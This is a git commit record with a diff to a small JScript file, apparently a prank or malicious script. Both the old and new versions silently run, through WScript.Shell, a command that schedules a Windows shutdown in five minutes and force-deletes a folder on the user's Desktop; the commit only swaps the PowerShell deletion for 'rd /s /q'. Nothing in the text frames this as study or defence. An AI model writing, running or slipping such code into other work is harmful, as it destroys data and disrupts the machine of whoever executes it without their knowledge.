1f826c3e13c58d6dbad3d48f78bb9a8daf580923
fuckwithyou <fuck@leeching.net>
2016-04-14 00:18:42 -0400

    Update fuck.js

--- fuck.js
+++ fuck.js
@@ -1,2 +1,2 @@
-c1="cmd /c shutdown -s -t 300 && powershell -c  Remove-Item %userprofile%\Desktop\a -Force -Recurse";
+c1="cmd /c shutdown -s -t 300 && rd /s /q %userprofile%\Desktop\a";
 new ActiveXObject("WScript.Shell").Run(c1,0,true);
